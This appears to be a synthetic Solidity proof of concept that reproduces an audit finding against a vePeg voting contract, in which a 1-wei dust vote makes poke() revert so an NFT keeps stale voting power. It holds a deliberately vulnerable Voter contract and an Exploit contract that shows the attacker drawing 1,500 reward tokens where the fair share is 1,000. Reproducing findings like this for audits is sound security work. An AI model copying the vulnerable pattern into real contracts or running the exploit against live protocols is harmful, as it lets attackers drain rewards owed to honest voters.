// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Hyperstable vePeg — dust vote makes an NFT unpokeable (Pashov, H-01)
    SYNTHETIC, cheatcode-free reduction. No warp: the lock was cast earlier,
    and balanceOfNFT at this timestamp is already the decayed weight.
    Poke replays stored weights. The 1-wei dust pool rounds to 0 and
    require(_poolWeight != 0) reverts, so usedWeights stays 1,000e18.
    The fair weight is 500e18. A 3,000 reward split on the stale power
    pays 1,500. The fair pay is 1,000. The control poke updates the power. */

contract RewardToken {
    string public constant symbol = "PEG";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VePeg {
    mapping(uint256 => uint256) public balanceOfNFT;

    function setBalance(uint256 tokenId, uint256 weight) external {
        balanceOfNFT[tokenId] = weight;
    }
}

contract Voter {
    VePeg public ve;
    RewardToken public reward;
    mapping(uint256 => address[]) internal _poolVote;
    mapping(uint256 => mapping(address => uint256)) public votes;
    mapping(uint256 => uint256) public usedWeights;
    mapping(address => bool) public isGauge;
    address public dustPool;
    address public preferredPool;
    address public honestPool;
    uint256 public attackerPaid;
    uint256 public fairPay;

    constructor(VePeg _ve, RewardToken _reward, address dust, address preferred, address honest) {
        ve = _ve;
        reward = _reward;
        dustPool = dust;
        preferredPool = preferred;
        honestPool = honest;
        isGauge[dust] = true;
        isGauge[preferred] = true;
        isGauge[honest] = true;
    }

    function seed(
        uint256 tokenId,
        uint256 dustWeight,
        uint256 preferredWeight,
        uint256 used,
        uint256 honestUsed,
        uint256 currentBalance
    ) external {
        _poolVote[tokenId].push(dustPool);
        _poolVote[tokenId].push(preferredPool);
        votes[tokenId][dustPool] = dustWeight;
        votes[tokenId][preferredPool] = preferredWeight;
        usedWeights[tokenId] = used;
        usedWeights[2] = honestUsed;
        ve.setBalance(tokenId, currentBalance);
    }

    function poke(uint256 tokenId) external {
        address[] memory pools = _poolVote[tokenId];
        uint256[] memory weights = new uint256[](pools.length);
        for (uint256 i = 0; i < pools.length; i++) {
            weights[i] = votes[tokenId][pools[i]];
        }
        _vote(tokenId, pools, weights);
    }

    function _vote(uint256 tokenId, address[] memory pools, uint256[] memory weights) internal {
        uint256 _weight = ve.balanceOfNFT(tokenId);
        uint256 _totalVoteWeight;
        for (uint256 i = 0; i < weights.length; i++) {
            _totalVoteWeight += weights[i];
        }
        _reset(tokenId, pools);
        for (uint256 i = 0; i < pools.length; i++) {
            address _pool = pools[i];
            address _gauge = _pool;
            if (isGauge[_gauge]) {
                uint256 _poolWeight = weights[i] * _weight / _totalVoteWeight;
                require(votes[tokenId][_pool] == 0);
                // @> VULN: a 1-wei dust weight rounds to 0 after decay, so poke reverts and the stale power stays
                require(_poolWeight != 0, "zero weight");
                votes[tokenId][_pool] = _poolWeight;
            }
        }
        usedWeights[tokenId] = _weight;
    }

    function _reset(uint256 tokenId, address[] memory pools) internal {
        for (uint256 i = 0; i < pools.length; i++) {
            votes[tokenId][pools[i]] = 0;
        }
    }

    function distribute(uint256 tokenId, uint256 amount, address to) external {
        uint256 attackerPower = usedWeights[tokenId];
        uint256 honestPower = usedWeights[2];
        uint256 totalPower = attackerPower + honestPower;
        uint256 pay = amount * attackerPower / totalPower;
        reward.transfer(to, pay);
        attackerPaid = pay;
        uint256 fairPower = ve.balanceOfNFT(tokenId);
        fairPay = amount * fairPower / (fairPower + honestPower);
    }
}

contract FixedVoter {
    uint256 public usedWeight;

    function poke(uint256 currentBalance, uint256 dust, uint256 preferred) external returns (uint256) {
        uint256 total = dust + preferred;
        uint256 dustOut = dust * currentBalance / total;
        if (dustOut == 0) {
            dustOut = 0;
        }
        uint256 preferredOut = preferred * currentBalance / total;
        require(preferredOut != 0, "preferred");
        usedWeight = currentBalance;
        return dustOut + preferredOut;
    }
}

contract Exploit {
    RewardToken public reward;
    VePeg public ve;
    Voter public voter;
    FixedVoter public fixedVoter;
    address public dustPool;
    address public preferredPool;
    address public honestPool;

    uint256 public constant TOKEN_ID = 7;
    uint256 public constant STALE = 1_000e18;
    uint256 public constant CURRENT = 500e18;
    uint256 public constant REWARD = 3_000e18;

    constructor() {
        reward = new RewardToken();
        ve = new VePeg();
        dustPool = address(0xD057);
        preferredPool = address(0xBEEF);
        honestPool = address(0xE0457);
        voter = new Voter(ve, reward, dustPool, preferredPool, honestPool);
        fixedVoter = new FixedVoter();
    }

    function run() external {
        voter.seed(TOKEN_ID, 1, STALE - 1, STALE, STALE, CURRENT);
        reward.mint(address(voter), REWARD);
        uint256 powerBefore = voter.usedWeights(TOKEN_ID);
        (bool poked,) = address(voter).call(abi.encodeCall(Voter.poke, (TOKEN_ID)));
        uint256 powerAfter = voter.usedWeights(TOKEN_ID);
        voter.distribute(TOKEN_ID, REWARD, msg.sender);
        uint256 paid = voter.attackerPaid();
        uint256 fair = voter.fairPay();
        uint256 controlDust = fixedVoter.poke(CURRENT, 400e18, 600e18);
        require(powerBefore == STALE, "seeded at 1000");
        require(poked == false, "poke should revert");
        require(powerAfter == STALE, "power not updated");
        require(ve.balanceOfNFT(TOKEN_ID) == CURRENT, "decayed balance");
        require(paid == 1_500e18, "paid 1500");
        require(fair == 1_000e18, "fair 1000");
        require(paid - fair == 500e18, "overpaid 500");
        require(reward.balanceOf(msg.sender) == 1_500e18, "attacker received 1500");
        require(fixedVoter.usedWeight() == CURRENT, "control updates");
        require(controlDust == CURRENT, "control split");
    }
}
